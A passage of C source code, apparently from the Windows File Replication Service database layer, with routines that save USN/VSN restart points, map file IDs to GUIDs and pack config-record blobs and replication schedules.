     Caller must Acquire the VME lock so we can get the reference.

Arguments:

    pVme -- Volume Monitor Entry with saved USN and VSN state.

    Wait -- True if we are to wait until update completes.

Return Value:
    FrsError status.  Only if wait is true else FrsErrorSuccess returned.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsRequestSaveMark:"

    ULONG           FStatus = FrsErrorSuccess;
    ULONG           WStatus;
    PCOMMAND_PACKET CmdPkt;


    //
    // Get the reference on the Vme.  If the return is zero the Vme is gone.
    // The reference is dropped by savemark code.
    //
    if (AcquireVmeRef(pVme) == 0) {
        return FrsErrorSuccess;
    }

    //
    // Tell the DBService to save the mark point.
    //
    CmdPkt = DbsPrepareCmdPkt(NULL,                   //  CmdPkt,
                              NULL,                   //  Replica,
                              CMD_DBS_REPLICA_SAVE_MARK,  //  CmdRequest,
                              NULL,                   //  TableCtx,
                              pVme,                   //  CallContext,
                              0,                      //  TableType,
                              0,                      //  AccessRequest,
                              0,                      //  IndexType,
                              NULL,                   //  KeyValue,
                              0,                      //  KeyValueLength,
                              FALSE);                 //  Submit

    FRS_ASSERT(CmdPkt != NULL);


    if (Wait) {
        //
        // Make the call synchronous.
        // Don't free the packet when the command completes.
        //
        FrsSetCompletionRoutine(CmdPkt, FrsCompleteKeepPkt, NULL);

        //
        // SUBMIT db command request and wait for completion.
        //
        WStatus = FrsSubmitCommandServerAndWait(&DBServiceCmdServer, CmdPkt, INFINITE);
        DPRINT_WS(0, "ERROR: DB Command failed", WStatus);

        FStatus = CmdPkt->Parameters.DbsRequest.FStatus;
        FrsFreeCommand(CmdPkt, NULL);

    } else {

        //
        // Fire and forget the command.
        //
        FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
    }

    return FStatus;
}



ULONG
DbsReplicaSaveMark(
    IN PTHREAD_CTX           ThreadCtx,
    IN PREPLICA              Replica,
    IN PVOLUME_MONITOR_ENTRY pVme
    )
/*++

Routine Description:

    Save the volume sequence number and FSVolLastUSN in the Replica
    config record.  This routine should only be called if the Replica
    Service state is active.  Except for shutdown or error save situations.

    Journal Replay Mode : A given replica set is in "journal replay mode"
    when the journal read point has moved back to a point prior to the
    LastUsnRecordProceesed by this replica set.  This occurs when another
    replica set starts up and has to read from an older point in the journal.
    All journal records that normally would be processed by a replica set are
    ignored as long as the replica set is in replay mode.

    The following state variables are used to track USN Journal Processing.

                                ----------- WHERE UPDATED -----------

    Replica->InlogCommitUsn   - Here to keep up with SaveUsn *
                              - In ChgOrdReject() in lieu of Inlog Insert
                              - In ChgOrdInsertInlogRecord() after Inlog Insert

    Replica->LastUsnRecordProcessed
                              - Here to keep up with SaveUsn *
                              - At bottom of Jrnl Monitor thread loop if
                                the replica service state is active and not
                                in jrnl replay mode.
                              - In JrnlSetReplicaState when the state change
                                goes from ACTIVE to PAUSED.

    pVme->CurrentUsnRecordDone **
                              - In Jrnl Monitor thread when I/O is stopped.
                              - In Jrnl Monitor thread when USN records are filtered out.
                              - At bottom of Jrnl Monitor thread loop.

    Replica->LocalCoQueueCount
                              - In JrnlUpdateChangeOrder() when a CO is removed
                                from the process queue. dec
                              - In JrnlUpdateChangeOrder() when a CO is added
                                to the process queue. inc
                              - At the bottom of the CO process loop in
                                ChgOrdAccept(). dec
                              - In ChgOrdInsertProcessQueue() when a Local CO
                                is re-inserted onto the process queue. inc
                              - In ChgOrdReanimate() when a reanimate local
                                co is generated for a dead parent.

    ConfigRecord->FSVolLastUSN - Updated Here.


* Necessary to update them here in the event that there is a lot of activity
on the volume but none involving this replica set.  If a crash were to occur
and we failed to keep these read pointers up to date we could find ourselves
reading from a deleted portion of the journal and think we had lost journal data.

** It is possible, depending on timing between threads, for the InlogCmmitUsn to
move past LastUsnRecordProcessed.  This is a benign and transient event.



    DbsReplicaSaveMark is called directly or indirectly by
        - CMD_DBS_REPLICA_SAVE_MARK
        - DbsCloseSessionReplicaTables()
        - DbsRequestSaveMark().  Uses above DB command dispatch point.
        - DbsInitOneReplicaSet() when R/S is initialized to checkpoint the
          VSN restart point.
        - At the top of the Jrnl Monitor thread after JRNL_USN_SAVE_POINT_INTERVAL bytes
          (currently 16Kb) are consumed.
        - by the NEW_VSN macro every VSN_SAVE_INTERVAL (currently 256)
          VSNs are generated.

    This function can be called by the Jrnl Monitor thread, the Change order
    accept thread(s) or the DB thread(s).


Arguments:

    ThreadCtx  -- A Thread context to use for dbid and sesid.
    Replica    -- ptr to Replica struct.
    pVme       -- prt to volume monitor entry serving this Replica.

Return Value:

    FrsError status

--*/
{
#undef DEBSUB
#define DEBSUB "DbsReplicaSaveMark:"


    USN SaveUsn;
    ULONG FStatus;

    PCONFIG_TABLE_RECORD ConfigRecord;
    PCXTION              Cxtion;

    BOOL ReplayMode;
    BOOL ReplicaPaused;
    BOOL JrnlCxtionValid;

    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
    LOCK_VME(pVme);

    DPRINT2(4, ":U: Replica->InlogCommitUsn: %08x %08x   Replica->LastUsnRecordProcessed: %08x %08x\n",
            PRINTQUAD(Replica->InlogCommitUsn),
            PRINTQUAD(Replica->LastUsnRecordProcessed));

    if (Replica->LastUsnRecordProcessed < Replica->InlogCommitUsn) {
        DPRINT2(1, ":U: Warning:  possible USN progress update error. "
                " LastUsnRecordProcessed %08x %08x  < InlogCommitUsn %08x %08x\n",
                PRINTQUAD(Replica->LastUsnRecordProcessed),
                PRINTQUAD(Replica->InlogCommitUsn));
    }

    FRS_ASSERT(Replica->LocalCoQueueCount >= 0);

    //
    // This replica set is in replay mode if the Current USN record is before
    // the LastUsnRecordProcessed for the replica and the Replica state is active
    // or paused.
    //
    // If there are local change orders pending in the process queue or
    // replica set is not active (stopped, in error state) then
    // we can only advance the SaveUsn point to the InlogCommitUsn.
    //
    // Otherwise we can advance it to either the:
    //
    //     LastUsnRecordProcessed for the replica if in replay mode or paused, or
    //     CurrentUsnRecordDone otherwise.
    //
    ReplayMode = REPLICA_REPLAY_MODE(Replica, pVme);
    ReplicaPaused = (Replica->ServiceState == REPLICA_STATE_PAUSED);

    //
    // If the Journal Cxtion is "Unjoined" for this Replica Set then our
    // restart point is limited to the InlogCommitUsn since ChangeOrderAccept
    // will be throwing away all local COs.
    //
    JrnlCxtionValid = TRUE;
    LOCK_CXTION_TABLE(Replica);

    Cxtion = GTabLookupNoLock(Replica->Cxtions, &Replica->JrnlCxtionGuid, NULL);
    if ((Cxtion == NULL) ||
        !CxtionFlagIs(Cxtion, CXTION_FLAGS_JOIN_GUID_VALID) ||
        !CxtionStateIs(Cxtion, CxtionStateJoined) ) {
        JrnlCxtionValid = FALSE;
    }

    UNLOCK_CXTION_TABLE(Replica);


    //
    // Investigate: May need a lock around test of LocalCoQueueCount and fetch of
    //       CurrentUsnRecord to avoid small window in which a crash/recovery
    //       would skip a USN record just put on the queue.  Sigh
    //       an alternative is to capture the count and current USN record
    //       values at the call site.  This may work better.

    // Check if having the pVme lock is sufficient.

    if ((Replica->LocalCoQueueCount == 0) && JrnlCxtionValid &&
        ((Replica->ServiceState == REPLICA_STATE_ACTIVE) || ReplicaPaused)) {

        AcquireQuadLock(&pVme->QuadWriteLock);
        SaveUsn = (ReplayMode || ReplicaPaused) ? Replica->LastUsnRecordProcessed
                                                : pVme->CurrentUsnRecordDone;
        ReleaseQuadLock(&pVme->QuadWriteLock);

        if (ReplayMode || ReplicaPaused) {
            DPRINT1(4, ":U: Replay mode or replica paused (Qcount is zero)."
                    "  SaveUsn advanced to Replica->LastUsnRecordProcessed: %08x %08x\n",
                    PRINTQUAD(Replica->LastUsnRecordProcessed));
        } else {
            DPRINT1(4, ":U: Not Replay mode and not replica paused (Qcount is zero)."
                    "  SaveUsn advanced to pVme->CurrentUsnRecordDone: %08x %08x\n",
                    PRINTQUAD(pVme->CurrentUsnRecordDone));
        }

        //
        // Advance the Inlog Commit Point if we were able to move past it.
        // Note - This can put the InlogCommitUsn past the LastUsnRecordProcessed
        // for this replica set since the latter is only advanced when a record
        // for this replica set is sent to change order processing.  So advance
        // it as well.
        //
        if (SaveUsn > Replica->InlogCommitUsn) {

            AcquireQuadLock(&pVme->QuadWriteLock);
            //
            // retest with the lock.
            //
            if (SaveUsn > Replica->InlogCommitUsn) {
                Replica->InlogCommitUsn = SaveUsn;
                Replica->LastUsnRecordProcessed = SaveUsn;
            }
            ReleaseQuadLock(&pVme->QuadWriteLock);

            DPRINT1(4, ":U: Replica->InlogCommitUsn advanced to: %08x %08x\n",
                    PRINTQUAD(Replica->InlogCommitUsn));
        }
    } else {
        AcquireQuadLock(&pVme->QuadWriteLock);
        SaveUsn = Replica->InlogCommitUsn;
        ReleaseQuadLock(&pVme->QuadWriteLock);

        DPRINT4(4, ":U: Replica->ServiceState not active (%s) or Qcount nonzero (%d)"
                " or JrnlCxtionUnjoined (%s) SaveUsn advanced to InlogCommitUsn: %08x %08x\n",
                RSS_NAME(Replica->ServiceState),
                Replica->LocalCoQueueCount,
                JrnlCxtionValid ? "No" : "Yes",
                PRINTQUAD(SaveUsn));
    }

    //
    // If the new save USN is less than or equal to FSVolLastUSN (our last save
    // point) for this Replica then we ignore it.  This could happen when we
    // have something in the queue that has not made it to the inbound log after
    // a long period of inactivity (on our Replica set) where we were advancing
    // our save point with the CurrentUsnRecord.  Or it could be due to having
    // just entered replay mode because another replica set started up.
    //

    AcquireQuadLock(&pVme->QuadWriteLock);
    if (SaveUsn > ConfigRecord->FSVolLastUSN) {
        ConfigRecord->FSVolLastUSN = SaveUsn;
    }
    ReleaseQuadLock(&pVme->QuadWriteLock);

    //
    // Save current VSN.  Check that it never moves backwards.
    //
    FRS_ASSERT(pVme->FrsVsn >= ConfigRecord->FrsVsn);
    if ((pVme->FrsVsn - ConfigRecord->FrsVsn) > 2*MaxPartnerClockSkew) {
        DPRINT3(0, ":U: ERROR - Vsn out of date for %ws (pVme Vsn %08x %08x ; ConfigVsn %08x %08x)\n",
                Replica->ReplicaName->Name,
                PRINTQUAD(pVme->FrsVsn),
                PRINTQUAD(ConfigRecord->FrsVsn));
    }
    ConfigRecord->FrsVsn = pVme->FrsVsn;

    //
    // Update the selected fields in the config record.
    //
    FStatus = DbsUpdateConfigTableFields(ThreadCtx,
                                         Replica,
                                         CnfMarkPointFieldList,
                                         CnfMarkPointFieldCount);
    DPRINT1_FS(0, ":U: DbsUpdateConfigTableFields(%ws);", Replica->ReplicaName->Name, FStatus);

    DPRINT2(4, ":U: Save ConfigRecord->FSVolLastUSN %08x %08x    ConfigRecord->FrsVsn  %08x %08x\n",
            PRINTQUAD(ConfigRecord->FSVolLastUSN), PRINTQUAD(ConfigRecord->FrsVsn));

    FRS_ASSERT(FRS_SUCCESS(FStatus));

    //
    // The lock extends to here to avoid a race with another thread attempting
    // to save this state in the DB and getting them out of order.
    // Use an inprogress flag if this is a perf problem.
    //
    UNLOCK_VME(pVme);

    return FStatus;

}


ULONG
DbsRequestReplicaServiceStateSave(
    IN PREPLICA Replica,
    IN BOOL     Wait
    )
/*++
Routine Description:

     Call the DBService thread to save the replica service state.

Arguments:


    Replica    -- ptr to Replica struct.

    Wait -- True if we are to wait until update completes.

Return Value:
    FrsError status.  Only if wait is true else FrsErrorSuccess returned.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsRequestReplicaServiceStateSave:"

    ULONG           FStatus = FrsErrorSuccess;
    ULONG           WStatus;
    PCOMMAND_PACKET CmdPkt;


    //
    // Tell the DBService to save the mark point.
    //
    CmdPkt = DbsPrepareCmdPkt(NULL,                   //  CmdPkt,
                              Replica,                //  Replica,
                              CMD_DBS_REPLICA_SERVICE_STATE_SAVE,  //  CmdRequest,
                              NULL,                   //  TableCtx,
                              NULL,                   //  CallContext,
                              0,                      //  TableType,
                              0,                      //  AccessRequest,
                              0,                      //  IndexType,
                              NULL,                   //  KeyValue,
                              0,                      //  KeyValueLength,
                              FALSE);                 //  Submit

    FRS_ASSERT(CmdPkt != NULL);


    if (Wait) {
        //
        // Make the call synchronous.
        // Don't free the packet when the command completes.
        //
        FrsSetCompletionRoutine(CmdPkt, FrsCompleteKeepPkt, NULL);

        //
        // SUBMIT db command request and wait for completion.
        //
        WStatus = FrsSubmitCommandServerAndWait(&DBServiceCmdServer, CmdPkt, INFINITE);
        DPRINT_WS(0, "ERROR: DB Command failed", WStatus);

        FStatus = CmdPkt->Parameters.DbsRequest.FStatus;
        FrsFreeCommand(CmdPkt, NULL);

    } else {

        //
        // Fire and forget the command.
        //
        FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
    }

    return FStatus;
}



VOID
DbsReplicaSaveStats(
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica
    )
/*++

Routine Description:

    Save the Stats in the Replica config record.

Arguments:

    ThreadCtx  -- A Thread context to use for dbid and sesid.
    Replica    -- ptr to Replica struct.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsReplicaSaveStats:"

    ULONG FStatus;

    //
    // Update the selected fields in the config record.
    //
    FStatus = DbsUpdateConfigTableFields(ThreadCtx,
                                         Replica,
                                         CnfStatFieldList,
                                         CnfStatFieldCount);
    DPRINT1_FS(0, "DbsReplicaSaveStats on %ws.", Replica->ReplicaName->Name, FStatus);
}



ULONG
DbsFidToGuid(
    IN PTHREAD_CTX   ThreadCtx,
    IN PREPLICA      Replica,
    IN PTABLE_CTX    TableCtx,
    IN PULONGLONG    Fid,
    OUT GUID         *Guid
    )
/*++
Routine Description:

    Translate the File IDs to it's object ID (GUID) by
    doing a lookup in the IDTable for the replica.

    Since the caller supplies the table context we do not free the table ctx
    storage here.  We do close the table though.  It is up to the caller to
    free the table ctx memory when finished with it.  Note that the same
    table ctx can be used on multiple calls thereby saving the cost of
    memory allocation each time.  To free the table ctx internal storage:

            DbsFreeTableContext(TableCtx, ThreadCtx->JSesid);
            TableCtx = NULL;


Arguments:
    ThreadCtx  -- A Thread context to use for dbid and sesid.
    Replica    -- The Replica ID table to do the lookup in.
    TableCtx   -- Caller supplied so we don't have to alloc storage on every call.
    Fid  -- The parent file ID to translate
    Guid -- The output parent object ID.

Return Value:

    Frs Status

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsFidToGuid:"

    JET_ERR     jerr, jerr1;

    PIDTABLE_RECORD      IDTableRec;
    ULONG       FStatus = FrsErrorSuccess;
    CHAR        GuidStr[GUID_CHAR_LEN];

    //
    // PERF: switch to using the DIR Table once the updates are in place.
    //
    if (Replica == NULL) {
        ZeroMemory(Guid, sizeof(GUID));
        return FrsErrorBadParam;
    }
    //
    // Open the IDTable for this replica and Read the IDTable Record
    // for the File ID.
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, Replica->ReplicaNumber, IDTablex, NULL);

    if (!JET_SUCCESS(jerr)) {
        ZeroMemory(Guid, sizeof(GUID));
        return DbsTranslateJetError(jerr, FALSE);
    }

    jerr = DbsReadRecord(ThreadCtx, Fid, FileIDIndexx, TableCtx);

    IDTableRec = (PIDTABLE_RECORD) (TableCtx->pDataRecord);

    //
    // If the record is not found return the GUID, even if it is marked deleted.
    // That would just mean that a remote CO was processing a delete while a
    // local operation was updating the file and generating a USN record with
    // the FID.
    //
    if (!JET_SUCCESS(jerr)) {
        ZeroMemory(Guid, sizeof(GUID));
        FStatus = DbsTranslateJetError(jerr, FALSE);
    } else {
        COPY_GUID(Guid, &IDTableRec->FileGuid);

        if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETED)) {

            if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETE_DEFERRED)) {
                FStatus = FrsErrorIdtFileIsDeleteDef;
            } else {
                FStatus = FrsErrorIdtFileIsDeleted;
            }

        } else {
            FStatus = FrsErrorSuccess;
        }
    }

    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);

    GuidToStr((GUID *) Guid, GuidStr);
    DPRINT2(3,"++ FID to GUID: %08x %08x -> %s\n", PRINTQUAD(*Fid), GuidStr);

    return FStatus;
}




ULONG
DbsGuidToFid(
    IN PTHREAD_CTX   ThreadCtx,
    IN PREPLICA      Replica,
    IN PTABLE_CTX    TableCtx,
    IN GUID          *Guid,
    OUT PULONGLONG   Fid
    )
/*++
Routine Description:

    Translate the  File IDs to it's object ID (GUID) by
    doing a lookup in the IDTable for the replica.

    Since the caller supplies the table context we do not free the table ctx
    storage here.  We do close the table though.  It is up to the caller to
    free the table ctx memory when finished with it.  Note that the same
    table ctx can be used on multiple calls thereby saving the cost of
    memory allocation each time.  To free the table ctx internal storage:

            DbsFreeTableContext(TableCtx, ThreadCtx->JSesid);
            TableCtx = NULL;


Arguments:
    ThreadCtx  -- A Thread context to use for dbid and sesid.
    Replica    -- The Replica ID table to do the lookup in.
    TableCtx   -- Caller supplied so we don't have to alloc storage on every call.
    Guid -- The input parent object ID to translate.
    Fid  -- The output parent file ID

Return Value:

    Frs Status

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsGuidToFid:"

    JET_ERR     jerr, jerr1;

    PIDTABLE_RECORD      IDTableRec;
    ULONG       FStatus;
    CHAR        GuidStr[GUID_CHAR_LEN];

    //
    // switch to using the DIR Table once the updates are in place.
    //

    if (Replica == NULL) {
        *Fid = ZERO_FID;
        return FrsErrorBadParam;
    }
    //
    // Open the IDTable for this replica and Read the IDTable Record
    // for the File ID.
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, Replica->ReplicaNumber, IDTablex, NULL);

    if (!JET_SUCCESS(jerr)) {
        *Fid = ZERO_FID;
        return DbsTranslateJetError(jerr, FALSE);
    }

    jerr = DbsReadRecord(ThreadCtx, Guid, GuidIndexx, TableCtx);


    IDTableRec = (PIDTABLE_RECORD) (TableCtx->pDataRecord);

    //
    // If the record is not found or it is marked deleted, return a FID of zero.
    //
    if (!JET_SUCCESS(jerr)) {
        *Fid = ZERO_FID;
        FStatus = DbsTranslateJetError(jerr, FALSE);
    } else {
        //
        // 209483   B3SS : Assertion Qkey != 0
        // Return a fid even if the entry is deleted. The co will be
        // rejected eventually but intervening code asserts if fid is 0.
        //
        CopyMemory(Fid, &IDTableRec->FileID, sizeof(ULONGLONG));
        if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETED)) {

            if (IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETE_DEFERRED)) {
                FStatus = FrsErrorIdtFileIsDeleteDef;
            } else {
                FStatus = FrsErrorIdtFileIsDeleted;
            }

        } else {
            FStatus = FrsErrorSuccess;
        }
    }

    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);

    GuidToStr(Guid, GuidStr);
    DPRINT2(3,"++ GUID to FID: %s -> %08x %08x\n", GuidStr, PRINTQUAD(*Fid));

    return FStatus;
}




PUCHAR
PackMem(
    IN PUCHAR Dst,
    IN PVOID  Src,
    IN ULONG  Num
    )
/*++
Routine Description:
    Copy memory from Src to Dst and return the address of the byte
    at Dst + Num;
    This function relies on the caller to pass valid arguments. No
    input validation.

Arguments:
    Dst
    Src
    Num

Return Value:
    Dst + Num
--*/
{
#undef DEBSUB
#define DEBSUB  "PackMem:"
    CopyMemory(Dst, (PUCHAR)Src, Num);
    return Dst + Num;
}




PUCHAR
UnPackMem(
    IN PUCHAR Next,
    IN PVOID  Dst,
    IN ULONG  Num
    )
/*++
Routine Description:
    Copy memory from Next to Dst and return the address of the byte
    at Next + Num;
    This function relies on the caller to pass valid arguments. No
    input validation.

Arguments:
    Next
    Dst
    Num

Return Value:
    Next + Num
--*/
{
#undef DEBSUB
#define DEBSUB  "UnPackMem:"
    CopyMemory(Dst, Next, Num);
    return Next + Num;
}




ULONG
SizeOfString(
    IN PWCHAR String
    )
/*++
Routine Description:
    Size the string for the blob. The string begins with its length,
    including the null terminator, in a ULONG.

Arguments:
    String

Return Value:
    Size of the string + length
--*/
{
#undef DEBSUB
#define DEBSUB  "SizeOfString:"
    ULONG   Size;

    Size = sizeof(Size);
    if (String)
        Size += (wcslen(String) + 1) * sizeof(WCHAR);
    return Size;
}




PUCHAR
UnPackString(
    IN  PUCHAR   Next,
    OUT PWCHAR   *String
    )
/*++
Routine Description:
    Allocate and return a copy of the string at Next

Arguments:
    Next
    String

Return Value:
    Address of the copy of the string at Next and the address
    of the byte following the string.
--*/
{
#undef DEBSUB
#define DEBSUB  "UnPackString:"
    ULONG   Len;

    *String = NULL;

    Next = UnPackMem(Next, &Len, sizeof(Len));
    if (Len) {
        *String = FrsAlloc(Len);
        Next = UnPackMem(Next, *String, Len);
    }
    return Next;
}




PUCHAR
PackString(
    IN PUCHAR   Next,
    IN PWCHAR   String
    )
/*++
Routine Description:
    Pack the string into the blob

Arguments:
    Next
    String

Return Value:
    Address of the byte following the string.
--*/
{
#undef DEBSUB
#define DEBSUB  "PackString:"
    ULONG   Len;

    Len = (String) ? (wcslen(String) + 1) * sizeof(WCHAR) : 0;
    Next = PackMem(Next, &Len, sizeof(Len));
    if (Len)
        Next = PackMem(Next, String, Len);
    return Next;
}





ULONG
SizeOfGName(
    IN PGNAME GName
    )
/*++
Routine Description:
    Size the GName

Arguments:
    GName

Return Value:
    Size of the guid/name making up the gname
--*/
{
#undef DEBSUB
#define DEBSUB  "SizeGName:"
    return sizeof(GUID) + SizeOfString(GName->Name);
}





PUCHAR
UnPackGName(
    IN  PUCHAR   Next,
    OUT PGNAME   *GName
    )
/*++
Routine Description:
    Allocate and return a copy of the gname at Next

Arguments:
    Next
    GName

Return Value:
    Address of the copy of the gname at Next and the address
    of the byte following the gname.
--*/
{
#undef DEBSUB
#define DEBSUB  "UnPackGName:"
    PWCHAR  Name;

    *GName = FrsBuildGName((GUID *)FrsAlloc(sizeof(GUID)), NULL);
    Next = UnPackMem(Next, (*GName)->Guid, sizeof(GUID));
    return UnPackString(Next, &(*GName)->Name);
}





PUCHAR
PackGName(
    IN PUCHAR   Next,
    IN PGNAME   GName
    )
/*++
Routine Description:
    Pack the gname into the blob

Arguments:
    Next
    GName

Return Value:
    Address of the byte following the gname in the blob.
--*/
{
#undef DEBSUB
#define DEBSUB  "PackGName:"
    Next = PackMem(Next, GName->Guid, sizeof(GUID));
    return PackString(Next, GName->Name);
}





ULONG
DbsPackInboundPartnerState(
    IN  PREPLICA    Replica,
    IN  PTABLE_CTX  TableCtx
    )
/*++
Routine Description:
    Build a blob and attach it to the InboundPartnerState field.

Arguments:
    Replica
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsPackInboundPartnerState:"
    PUCHAR  Next;
    ULONG   BlobSize;
    ULONG   FStatus;

    //
    // COMPUTE BLOB SIZE
    //

    //
    // Primitive types
    //
    BlobSize = 0;
    BlobSize += sizeof(BlobSize);
    BlobSize += sizeof(NtFrsMajor);
    BlobSize += sizeof(NtFrsMinor);

    //
    // Reallocate the blob
    //
    FStatus = DBS_REALLOC_FIELD(TableCtx, InboundPartnerStatex, BlobSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT(0, "++ ERROR - reallocating inbound partner blob\n");
        return FStatus;
    }

    //
    // POPULATE THE BLOB
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, InboundPartnerStatex);

    //
    // Primitive types
    //
    Next = PackMem(Next, &BlobSize, sizeof(BlobSize));
    Next = PackMem(Next, &NtFrsMajor, sizeof(NtFrsMajor));
    Next = PackMem(Next, &NtFrsMinor, sizeof(NtFrsMinor));

    FRS_ASSERT(Next == BlobSize +
                   (PUCHAR)DBS_GET_FIELD_ADDRESS(TableCtx, InboundPartnerStatex));

    //
    // Done
    //
    return FrsErrorSuccess;
}


ULONG
DbsUnPackInboundPartnerState(
    IN PREPLICA     Replica,
    IN PTABLE_CTX   TableCtx
    )
/*++
Routine Description:
    Unpack the InboundPartnerState blob.

Arguments:
    Replica
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsUnPackInboundPartnerState:"
    PUCHAR  Next;
    ULONG   BlobSize;
    ULONG   ConfigMajor;
    ULONG   ConfigMinor;

    //
    // POPULATE THE BLOB
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, InboundPartnerStatex);
    if (Next == NULL) {
        return FrsErrorSuccess;
    }

    //
    // Blob's size
    //
    Next = UnPackMem(Next, &BlobSize, sizeof(BlobSize));
    if (BlobSize == 0) {
        return FrsErrorSuccess;
    }

    //
    // Major, minor
    //
    Next = UnPackMem(Next, &ConfigMajor, sizeof(ConfigMajor));
    Next = UnPackMem(Next, &ConfigMinor, sizeof(ConfigMinor));
    if (ConfigMajor != NtFrsMajor) {
        DPRINT(0, "++ ERROR - BAD MAJOR IN CONFIG RECORD; shutting down\n");
        FRS_ASSERT(!"BAD MAJOR VERSION NUMBER IN CONFIG RECORD.");
        return FrsErrorAccess;
    }

    FRS_ASSERT(Next == BlobSize +
                   (PUCHAR)DBS_GET_FIELD_ADDRESS(TableCtx, InboundPartnerStatex));

    //
    // Done
    //
    return ERROR_SUCCESS;
}


ULONG
DbsPackIntoConfigRecordBlobs(
    IN  PREPLICA    Replica,
    IN  PTABLE_CTX  TableCtx
    )
/*++
Routine Description:
    Build a blob and attach it to the configrecord->InboundPartnerState

Arguments:
    Replica
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsPackIntoConfigRecordBlobs:"

    ULONG   FStatus;

    FStatus = DbsPackInboundPartnerState(Replica, TableCtx);
    if (FRS_SUCCESS(FStatus)) {
        FStatus = DbsPackSchedule(Replica->Schedule, ReplSchedx, TableCtx);
    }
    return FStatus;
}


ULONG
DbsUnPackFromConfigRecordBlobs(
    IN  PREPLICA    Replica,
    IN  PTABLE_CTX  TableCtx
    )
/*++
Routine Description:
    Unpack the ConfigRecord's blobs.

Arguments:
    Replica
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsUnPackFromConfigRecordBlobs:"
    ULONG   FStatus;

    FStatus = DbsUnPackInboundPartnerState(Replica, TableCtx);

    if (FRS_SUCCESS(FStatus)) {
        FStatus = DbsUnPackSchedule(&Replica->Schedule, ReplSchedx, TableCtx);
        DBS_DISPLAY_SCHEDULE(4, L"Schedule unpacked for Replica:", Replica->Schedule);
    }

    return FStatus;
}



ULONG
DbsPackSchedule(
    IN  PSCHEDULE   Schedule,
    IN  ULONG       Fieldx,
    IN  PTABLE_CTX  TableCtx
    )
/*++
Routine Description:
    Build a blob and attach it to the ReplSched field.

Arguments:
    Schedule
    Fieldx
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsPackSchedule:"
    PUCHAR  Next;
    ULONG   BlobSize;
    ULONG   FStatus;
    ULONG   ScheduleLength;

    DBS_DISPLAY_SCHEDULE(4, L"Schedule packing:", Schedule);

    //
    // EMPTY BLOB
    //
    if (Schedule == NULL) {
        FStatus = DBS_REALLOC_FIELD(TableCtx, Fieldx, 0, FALSE);
        DPRINT_FS(0, "++ ERROR - reallocating schedule blob to 0.", FStatus);
        return FStatus;
    }

    //
    // COMPUTE BLOB SIZE
    //

    //
    // Primitive types
    //
    BlobSize = 0;
    BlobSize += sizeof(BlobSize);
    BlobSize += sizeof(ScheduleLength);
    ScheduleLength = (Schedule->Schedules[Schedule->NumberOfSchedules - 1].Offset
                      + SCHEDULE_DATA_ENTRIES);
    BlobSize += ScheduleLength;

    //
    // Reallocate the blob
    //
    FStatus = DBS_REALLOC_FIELD(TableCtx, Fieldx, BlobSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT1_FS(0, "++ ERROR - reallocating schedule blob to %d.", BlobSize, FStatus);
        return FStatus;
    }

    //
    // POPULATE THE BLOB
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx);

    //
    // Primitive types
    //
    Next = PackMem(Next, &BlobSize, sizeof(BlobSize));
    Next = PackMem(Next, &ScheduleLength, sizeof(ScheduleLength));
    Next = PackMem(Next, Schedule, ScheduleLength);

    FRS_ASSERT(Next == BlobSize +
               (PUCHAR)DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx));

    //
    // Done
    //
    return FrsErrorSuccess;
}




ULONG
DbsUnPackSchedule(
    IN PSCHEDULE    *Schedule,
    IN ULONG        Fieldx,
    IN PTABLE_CTX   TableCtx
    )
/*++
Routine Description:
    Unpack the schedule blob.

Arguments:
    Schedule
    Fieldx
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsUnPackSchedule:"
    PUCHAR  Next;
    ULONG   BlobSize;
    ULONG   ScheduleLength;

    //
    // No schedule so far
    //
    *Schedule = FrsFree(*Schedule);

    //
    // POPULATE THE BLOB
    //
    Next = DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx);
    if (Next == NULL) {
        return FrsErrorSuccess;
    }

    //
    // Blob's size
    //
    Next = UnPackMem(Next, &BlobSize, sizeof(BlobSize));
    if (BlobSize == 0) {
        return FrsErrorSuccess;
    }

    //
    // Schedule's size
    //
    Next = UnPackMem(Next, &ScheduleLength, sizeof(ScheduleLength));
    if (ScheduleLength == 0) {
        return FrsErrorSuccess;
    }

    *Schedule = FrsAlloc(ScheduleLength);
    Next = UnPackMem(Next, *Schedule, ScheduleLength);

    FRS_ASSERT(Next == BlobSize +
                   (PUCHAR)DBS_GET_FIELD_ADDRESS(TableCtx, Fieldx));
    //
    // Done
    //
    return FrsErrorSuccess;
}


ULONG
DbsPackStrW(
    IN  PWCHAR      StrW,
    IN  ULONG       Fieldx,
    IN  PTABLE_CTX  TableCtx
    )
/*++
Routine Description:
    Update a variable length string field.

Arguments:
    StrW
    Fieldx
    TableCtx

Return Value:
    None
--*/
{
#undef DEBSUB
#define DEBSUB  "DbsPackStrW:"
    PUCHAR  Next;
    ULONG   BlobSize;
    ULONG   FStatus;

